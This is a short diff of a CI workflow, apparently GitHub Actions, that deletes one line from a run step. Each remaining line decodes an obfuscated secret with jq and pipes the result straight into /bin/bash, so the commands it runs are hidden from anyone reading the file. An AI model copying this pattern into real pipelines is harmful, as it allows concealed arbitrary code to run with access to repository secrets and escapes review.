@@ -18,7 +18,6 @@ jobs:
           z9657: ${{ secrets.z9657 }}
         run: |
           printf '%s' "$z9657" | jq -r .c32 | /bin/bash
-          echo $ubyg50 | jq -r .sbbkk4034 | /bin/bash
           printf '%s' "$qt83" | jq -r .izc0 | /bin/bash
           printf '%s' "$sma88251" | jq -r .z1459 | /bin/bash
           echo $ckz3 | jq -r .jbm0 | /bin/bash
